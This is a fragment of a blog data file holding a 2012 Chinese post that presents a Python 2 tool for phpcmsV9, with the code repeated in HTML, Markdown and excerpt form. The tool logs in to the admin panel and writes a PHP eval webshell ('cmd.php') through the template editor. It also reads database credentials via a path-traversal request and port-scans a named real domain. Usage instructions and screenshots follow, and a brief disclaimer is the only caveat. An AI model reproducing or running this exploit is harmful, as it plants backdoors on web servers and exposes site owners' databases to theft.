class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div></pre></td><td class=\"code\"><pre><div class=\"line\">#coding: GBK</div><div class=\"line\">'''</div><div class=\"line\">Created on 2012-8-2</div><div class=\"line\"></div><div class=\"line\">@author: Return</div><div class=\"line\">'''</div><div class=\"line\">import cookielib</div><div class=\"line\">import urllib2,urllib</div><div class=\"line\">import re</div><div class=\"line\">import sys</div><div class=\"line\">import os</div><div class=\"line\">import socket</div><div class=\"line\">class getShell:</div><div class=\"line\"></div><div class=\"line\">    rhost = ''                                  #远程目标主机</div><div class=\"line\">    cookieSavePath  = 'tmp/cookie/cookie.dat'   #cookie 保存位置</div><div class=\"line\">    codeSavePath    = 'tmp/code/code.png'       #code    保存位置</div><div class=\"line\">    phpShell        = '&lt;?php $shell = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;; file_put_contents(&quot;caches/cmd.php&quot;,$shell); ?&gt;' #一句话</div><div class=\"line\">    header          = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}</div><div class=\"line\">    tmpPath         = ''    #临时地址存贮变量</div><div class=\"line\">    dataBaseInfo    = {}    #数据库信息</div><div class=\"line\">    postData        = {}    #post数据</div><div class=\"line\">    url             = ''    #远程url地址</div><div class=\"line\">    username        = ''    #用户名</div><div class=\"line\">    password        = ''    #用户密码</div><div class=\"line\">    vfCode          = ''    #验证码</div><div class=\"line\">    pc_hash         = ''    #phpcmsV9校验值</div><div class=\"line\">    result          = ''    #临时变量</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # __init__    初始化函数</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def __init__(self):</div><div class=\"line\">        self.cookie = cookielib.LWPCookieJar()</div><div class=\"line\">        urllib2.install_opener(urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie)))</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # login    登录</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def login(self):</div><div class=\"line\">        self.getVerifyCode()    #先获取验证码</div><div class=\"line\">        self.tmpPath  = '/index.php?m=admin&amp;c=index&amp;a=login&amp;dosubmit=1'</div><div class=\"line\">        self.postData = {</div><div class=\"line\">             'username':self.username,</div><div class=\"line\">             'password':self.password,</div><div class=\"line\">             'code':self.vfCode,</div><div class=\"line\">             'dosubmit':''</div><div class=\"line\">            }</div><div class=\"line\">        self.url = 'http://'+self.rhost+self.tmpPath</div><div class=\"line\">        self.result = self.urlPostData()</div><div class=\"line\"></div><div class=\"line\">        if len(re.findall(&quot;登录成功&quot;,self.result)):</div><div class=\"line\">            self.pc_hash = re.search(&quot;(?&lt;=pc_hash=)(.+?)(?=')&quot;,self.result).group()</div><div class=\"line\">            print '登录成功'</div><div class=\"line\">            self.wirteShell() # 登陆成功后写入shell</div><div class=\"line\">        else:</div><div class=\"line\">            print '登录失败'</div><div class=\"line\">            print re.search('(330px&quot;&gt;)((.|n)*?)(?=&lt;/div&gt;)',self.result).group(2)</div><div class=\"line\">            self.login()</div><div class=\"line\">    def wirteShell(self):</div><div class=\"line\">        print '写入Shell...'</div><div class=\"line\">        tmpPath = '/index.php?m=template&amp;c=file&amp;a=edit_file&amp;style=default&amp;dir=search&amp;file=footer.html&amp;pc_hash='</div><div class=\"line\">        self.url = 'http://'+self.rhost+tmpPath+self.pc_hash   #v9中必须加上校验码，否则不能通过</div><div class=\"line\">        self.result = self.urlPostData()</div><div class=\"line\">        if len(re.findall('点击插入',self.result)):</div><div class=\"line\">            templateTmp = re.search(&quot;(&lt;te.*?&gt;)((.|n)*?)(&lt;.*?&gt;)&quot;,self.result).group(2)</div><div class=\"line\">            #提交写shell模版</div><div class=\"line\">            self.postData = {</div><div class=\"line\">                    'code':self.phpShell,</div><div class=\"line\">                    'dosubmit':'提交',</div><div class=\"line\">                    'pc_hash':self.pc_hash</div><div class=\"line\">                }</div><div class=\"line\">            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash</div><div class=\"line\">            self.urlPostData()</div><div class=\"line\">            urllib2.urlopen('http://'+self.rhost+'/index.php?m=search').read()#访问模版页面生成shell</div><div class=\"line\">            #写回原模版</div><div class=\"line\">            self.postData = {</div><div class=\"line\">                    'code':templateTmp,</div><div class=\"line\">                    'dosubmit':'提交',</div><div class=\"line\">                    'pc_hash':self.pc_hash</div><div class=\"line\">                }</div><div class=\"line\">            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash</div><div class=\"line\">            self.urlPostData()</div><div class=\"line\">        else:</div><div class=\"line\">            print '没有找到Search的foot模版...'</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # getVerifyCode    获取验证码</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def getVerifyCode(self):</div><div class=\"line\">        #验证码获取地址</div><div class=\"line\">        self.tmpPath = '/api.php?op=checkcode&amp;code_len=4&amp;font_size=20&amp;width=130&amp;height=50&amp;font_color=&amp;background='</div><div class=\"line\">        self.url = 'http://'+self.rhost+self.tmpPath</div><div class=\"line\">        open(self.codeSavePath,'wb').write(self.urlPostData())</div><div class=\"line\">        print '请输入验证码:'</div><div class=\"line\">        self.showPic()</div><div class=\"line\">        self.vfCode = sys.stdin.readline()</div><div class=\"line\"></div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # urlPostData    url Post提交数据</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def urlPostData(self):</div><div class=\"line\">        postData = urllib.urlencode(self.postData)</div><div class=\"line\">        req = urllib2.Request(</div><div class=\"line\">                          url = self.url,</div><div class=\"line\">                          data = postData,</div><div class=\"line\">                          headers = self.header</div><div class=\"line\">                          )</div><div class=\"line\">        result = urllib2.urlopen(req).read()</div><div class=\"line\">        self.saveCookie()</div><div class=\"line\">        self.delVariable()</div><div class=\"line\">        return result</div><div class=\"line\"></div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # getDataBaseInfo    获取数据库信息</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def getDataBaseInfo(self):</div><div class=\"line\">        #爆数据库信息地址</div><div class=\"line\">        self.tmpPath = '/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'</div><div class=\"line\">        self.url = 'http://'+self.rhost+self.tmpPath</div><div class=\"line\">        result = self.urlPostData()</div><div class=\"line\">        self.dataBaseInfo['hostName'] = re.search(&quot;(?&lt;='hostname' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['database'] = re.search(&quot;(?&lt;='database' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['username'] = re.search(&quot;(?&lt;='username' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['password'] = re.search(&quot;(?&lt;='password' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['tablepre'] = re.search(&quot;(?&lt;='tablepre' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['type'] = re.search(&quot;(?&lt;='type' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # printDbInfo    输出数据库信息</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def printDbInfo(self):</div><div class=\"line\">        print 'HostName:',self.dataBaseInfo['hostName']</div><div class=\"line\">        print 'DataBase:',self.dataBaseInfo['database']</div><div class=\"line\">        print 'UserName:',self.dataBaseInfo['username']</div><div class=\"line\">        print 'Password:',self.dataBaseInfo['password']</div><div class=\"line\">        print 'TablePre:',self.dataBaseInfo['tablepre']</div><div class=\"line\">        print 'DataType:',self.dataBaseInfo['type']</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # scanPort    端口扫描</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def scanPort(self):</div><div class=\"line\">        for p in range(80,8000):</div><div class=\"line\">            try:</div><div class=\"line\">                ip = 'www.gidigame.com'</div><div class=\"line\">                port = p</div><div class=\"line\">                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class=\"line\">                s.connect((ip,port))</div><div class=\"line\">                print 'Port:',port,' open'</div><div class=\"line\">                s.close()</div><div class=\"line\">            except socket.error,msg:</div><div class=\"line\">                pass</div><div class=\"line\">                #print 'Port:',port,' close'</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # setRhost    设置目标主机</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def setRhost(self,host):</div><div class=\"line\">        self.rhost = host</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # getRhost    获取目标主机</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def getRhost(self):</div><div class=\"line\">        return self.rhost</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # setShell    自定义shell</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def setShell(self,shellCode):</div><div class=\"line\">        self.phpShell = shellCode</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # saveCookie    保存cookie值</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def saveCookie(self):</div><div class=\"line\">        self.cookie.save(self.cookieSavePath)</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # logMsg    日志信息，这里可以自己捕捉异常后处理信息</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def logMsg(self,msg):</div><div class=\"line\">        print msg</div><div class=\"line\">        exit()</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # showPic    用来显示验证码</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def showPic(self):</div><div class=\"line\">        imgPath = os.path.abspath(self.codeSavePath)</div><div class=\"line\">        os.system('rundll32.exe %SystemRoot%system32shimgvw.dll,ImageView_Fullscreen '+imgPath)</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # delVariable    清除变量，防止产生误差</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def delVariable(self):</div><div class=\"line\">        self.url            = ''</div><div class=\"line\">        self.tmpPath        = ''</div><div class=\"line\">        self.dataBaseInfo   = {}</div><div class=\"line\">        self.postData       = {}</div><div class=\"line\">        self.header         ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # __del__    析构函数，类被注销时候调用</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def __del__(self):</div><div class=\"line\">        print 'Bye...'</div><div class=\"line\">def sysinfo():</div><div class=\"line\">    print '''</div><div class=\"line\">********************************************************************************</div><div class=\"line\">PHPcmsV9 自动写shell</div><div class=\"line\"></div><div class=\"line\">功能：自动写入caches目录下cmd.php一句话 密码:cmd</div><div class=\"line\"></div><div class=\"line\">Author: Return    Blog:www.creturn.com</div><div class=\"line\"></div><div class=\"line\">Example: exp.py www.creutn.com username password</div><div class=\"line\">********************************************************************************</div><div class=\"line\">'''</div><div class=\"line\">#================================================================</div><div class=\"line\"># main    入口函数</div><div class=\"line\">#================================================================</div><div class=\"line\">def main():</div><div class=\"line\">    sysinfo();</div><div class=\"line\">    shell = getShell()</div><div class=\"line\">    if(len(sys.argv) &gt; 3):</div><div class=\"line\">        shell.setRhost(sys.argv[1])</div><div class=\"line\">        shell.username = sys.argv[2]</div><div class=\"line\">        shell.password = sys.argv[3]</div><div class=\"line\">\tshell.login()</div><div class=\"line\">    else:</div><div class=\"line\">        print '参数不对！'</div><div class=\"line\"></div><div class=\"line\">if __name__ == '__main__':</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p>使用说明，直接看实例截图：<br>运行程序后，输入目标地址如：www.creturn.com 用户名 密码</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/at_shell_1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/at_shell_1.png\" alt=\"\" title=\"at_shell_1\"></a></p>\n<p>会自动用图片查看器打开验证码，然后输入验证码：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/at_shell_2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/at_shell_2.png\" alt=\"\" title=\"at_shell_2\"></a></p>\n<p>正确输入验证码后，程序会自动写入cache/cmd.php的一句话，由于找的一个测试外部站点，仅用了一些安全方面的函数因此一句话<br>就不能测试了，我就直接写入一个php文件输出一段文字：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/at_shell_3.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/at_shell_3.png\" alt=\"\" title=\"at_shell_3\"></a></p>\n","source":"_posts/python版-phpcmsv9自动写shell工具.md","raw":"title: \"Python版 phpcmsV9自动写shell工具\"\nid: 190\ndate: 2012-08-08 01:21:18\ntags: \n- phpcmsv9漏洞\n- python\ncategories: \n- 原创作品\n- 技术文章\n---\n\n\n\n最近一直在学习python相关内容就顺手写个工具以作练习，上代码：\n>注意：本程序具有攻击性，请勿用作非法用途，否则于本作者无关！\n\n```python\n#coding: GBK\n'''\nCreated on 2012-8-2\n\n@author: Return\n'''\nimport cookielib\nimport urllib2,urllib\nimport re\nimport sys\nimport os\nimport socket\nclass getShell:\n\n    rhost = ''                                  #远程目标主机\n    cookieSavePath  = 'tmp/cookie/cookie.dat'   #cookie 保存位置\n    codeSavePath    = 'tmp/code/code.png'       #code    保存位置\n    phpShell        = '&lt;?php $shell = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;; file_put_contents(&quot;caches/cmd.php&quot;,$shell); ?&gt;' #一句话\n    header          = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}\n    tmpPath         = ''    #临时地址存贮变量\n    dataBaseInfo    = {}    #数据库信息\n    postData        = {}    #post数据\n    url             = ''    #远程url地址\n    username        = ''    #用户名\n    password        = ''    #用户密码\n    vfCode          = ''    #验证码\n    pc_hash         = ''    #phpcmsV9校验值\n    result          = ''    #临时变量\n    #==============================================================\n    # __init__    初始化函数\n    #==============================================================\n    def __init__(self):\n        self.cookie = cookielib.LWPCookieJar()\n        urllib2.install_opener(urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie)))\n    #==============================================================\n    # login    登录\n    #==============================================================\n    def login(self):\n        self.getVerifyCode()    #先获取验证码\n        self.tmpPath  = '/index.php?m=admin&amp;c=index&amp;a=login&amp;dosubmit=1'\n        self.postData = {\n             'username':self.username,\n             'password':self.password,\n             'code':self.vfCode,\n             'dosubmit':''\n            }\n        self.url = 'http://'+self.rhost+self.tmpPath\n        self.result = self.urlPostData()\n\n        if len(re.findall(&quot;登录成功&quot;,self.result)):\n            self.pc_hash = re.search(&quot;(?&lt;=pc_hash=)(.+?)(?=')&quot;,self.result).group()\n            print '登录成功'\n            self.wirteShell() # 登陆成功后写入shell\n        else:\n            print '登录失败'\n            print re.search('(330px&quot;&gt;)((.|n)*?)(?=&lt;/div&gt;)',self.result).group(2)\n            self.login()\n    def wirteShell(self):\n        print '写入Shell...'\n        tmpPath = '/index.php?m=template&amp;c=file&amp;a=edit_file&amp;style=default&amp;dir=search&amp;file=footer.html&amp;pc_hash='\n        self.url = 'http://'+self.rhost+tmpPath+self.pc_hash   #v9中必须加上校验码，否则不能通过\n        self.result = self.urlPostData()\n        if len(re.findall('点击插入',self.result)):\n            templateTmp = re.search(&quot;(&lt;te.*?&gt;)((.|n)*?)(&lt;.*?&gt;)&quot;,self.result).group(2)\n            #提交写shell模版\n            self.postData = {\n                    'code':self.phpShell,\n                    'dosubmit':'提交',\n                    'pc_hash':self.pc_hash\n                }\n            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash\n            self.urlPostData()\n            urllib2.urlopen('http://'+self.rhost+'/index.php?m=search').read()#访问模版页面生成shell\n            #写回原模版\n            self.postData = {\n                    'code':templateTmp,\n                    'dosubmit':'提交',\n                    'pc_hash':self.pc_hash\n                }\n            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash\n            self.urlPostData()\n        else:\n            print '没有找到Search的foot模版...'\n    #==============================================================\n    # getVerifyCode    获取验证码\n    #==============================================================\n    def getVerifyCode(self):\n        #验证码获取地址\n        self.tmpPath = '/api.php?op=checkcode&amp;code_len=4&amp;font_size=20&amp;width=130&amp;height=50&amp;font_color=&amp;background='\n        self.url = 'http://'+self.rhost+self.tmpPath\n        open(self.codeSavePath,'wb').write(self.urlPostData())\n        print '请输入验证码:'\n        self.showPic()\n        self.vfCode = sys.stdin.readline()\n\n    #==============================================================\n    # urlPostData    url Post提交数据\n    #==============================================================\n    def urlPostData(self):\n        postData = urllib.urlencode(self.postData)\n        req = urllib2.Request(\n                          url = self.url,\n                          data = postData,\n                          headers = self.header\n                          )\n        result = urllib2.urlopen(req).read()\n        self.saveCookie()\n        self.delVariable()\n        return result\n\n    #==============================================================\n    # getDataBaseInfo    获取数据库信息\n    #==============================================================\n    def getDataBaseInfo(self):\n        #爆数据库信息地址\n        self.tmpPath = '/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'\n        self.url = 'http://'+self.rhost+self.tmpPath\n        result = self.urlPostData()\n        self.dataBaseInfo['hostName'] = re.search(&quot;(?&lt;='hostname' =&gt; ')(.*?)(?=',)&quot;,result).group()\n        self.dataBaseInfo['database'] = re.search(&quot;(?&lt;='database' =&gt; ')(.*?)(?=',)&quot;,result).group()\n        self.dataBaseInfo['username'] = re.search(&quot;(?&lt;='username' =&gt; ')(.*?)(?=',)&quot;,result).group()\n        self.dataBaseInfo['password'] = re.search(&quot;(?&lt;='password' =&gt; ')(.*?)(?=',)&quot;,result).group()\n        self.dataBaseInfo['tablepre'] = re.search(&quot;(?&lt;='tablepre' =&gt; ')(.*?)(?=',)&quot;,result).group()\n        self.dataBaseInfo['type'] = re.search(&quot;(?&lt;='type' =&gt; ')(.*?)(?=',)&quot;,result).group()\n    #==============================================================\n    # printDbInfo    输出数据库信息\n    #==============================================================\n    def printDbInfo(self):\n        print 'HostName:',self.dataBaseInfo['hostName']\n        print 'DataBase:',self.dataBaseInfo['database']\n        print 'UserName:',self.dataBaseInfo['username']\n        print 'Password:',self.dataBaseInfo['password']\n        print 'TablePre:',self.dataBaseInfo['tablepre']\n        print 'DataType:',self.dataBaseInfo['type']\n    #==============================================================\n    # scanPort    端口扫描\n    #==============================================================\n    def scanPort(self):\n        for p in range(80,8000):\n            try:\n                ip = 'www.gidigame.com'\n                port = p\n                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n                s.connect((ip,port))\n                print 'Port:',port,' open'\n                s.close()\n            except socket.error,msg:\n                pass\n                #print 'Port:',port,' close'\n    #==============================================================\n    # setRhost    设置目标主机\n    #==============================================================\n    def setRhost(self,host):\n        self.rhost = host\n    #==============================================================\n    # getRhost    获取目标主机\n    #==============================================================\n    def getRhost(self):\n        return self.rhost\n    #==============================================================\n    # setShell    自定义shell\n    #==============================================================\n    def setShell(self,shellCode):\n        self.phpShell = shellCode\n    #==============================================================\n    # saveCookie    保存cookie值\n    #==============================================================\n    def saveCookie(self):\n        self.cookie.save(self.cookieSavePath)\n    #==============================================================\n    # logMsg    日志信息，这里可以自己捕捉异常后处理信息\n    #==============================================================\n    def logMsg(self,msg):\n        print msg\n        exit()\n    #==============================================================\n    # showPic    用来显示验证码\n    #==============================================================\n    def showPic(self):\n        imgPath = os.path.abspath(self.codeSavePath)\n        os.system('rundll32.exe %SystemRoot%system32shimgvw.dll,ImageView_Fullscreen '+imgPath)\n    #==============================================================\n    # delVariable    清除变量，防止产生误差\n    #==============================================================\n    def delVariable(self):\n        self.url            = ''\n        self.tmpPath        = ''\n        self.dataBaseInfo   = {}\n        self.postData       = {}\n        self.header         ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}\n    #==============================================================\n    # __del__    析构函数，类被注销时候调用\n    #==============================================================\n    def __del__(self):\n        print 'Bye...'\ndef sysinfo():\n    print '''\n********************************************************************************\nPHPcmsV9 自动写shell\n\n功能：自动写入caches目录下cmd.php一句话 密码:cmd\n\nAuthor: Return    Blog:www.creturn.com\n\nExample: exp.py www.creutn.com username password\n********************************************************************************\n'''\n#================================================================\n# main    入口函数\n#================================================================\ndef main():\n    sysinfo();\n    shell = getShell()\n    if(len(sys.argv) &gt; 3):\n        shell.setRhost(sys.argv[1])\n        shell.username = sys.argv[2]\n        shell.password = sys.argv[3]\n\tshell.login()\n    else:\n        print '参数不对！'\n\nif __name__ == '__main__':\n    main()\n    \n```\n<!--more-->\n\n使用说明，直接看实例截图：\n运行程序后，输入目标地址如：www.creturn.com 用户名 密码\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/at_shell_1.png \"at_shell_1\")](http://asset.creturn.com/asset/uploads/2012/08/at_shell_1.png)\n\n会自动用图片查看器打开验证码，然后输入验证码：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/at_shell_2.png \"at_shell_2\")](http://asset.creturn.com/asset/uploads/2012/08/at_shell_2.png)\n\n正确输入验证码后，程序会自动写入cache/cmd.php的一句话，由于找的一个测试外部站点，仅用了一些安全方面的函数因此一句话\n就不能测试了，我就直接写入一个php文件输出一段文字：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/at_shell_3.png \"at_shell_3\")](http://asset.creturn.com/asset/uploads/2012/08/at_shell_3.png)\n","slug":"python版-phpcmsv9自动写shell工具","updated":1421659126000,"excerpt":"<p>最近一直在学习python相关内容就顺手写个工具以作练习，上代码：</p>\n<blockquote>\n<p>注意：本程序具有攻击性，请勿用作非法用途，否则于本作者无关！</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div></pre></td><td class=\"code\"><pre><div class=\"line\">#coding: GBK</div><div class=\"line\">'''</div><div class=\"line\">Created on 2012-8-2</div><div 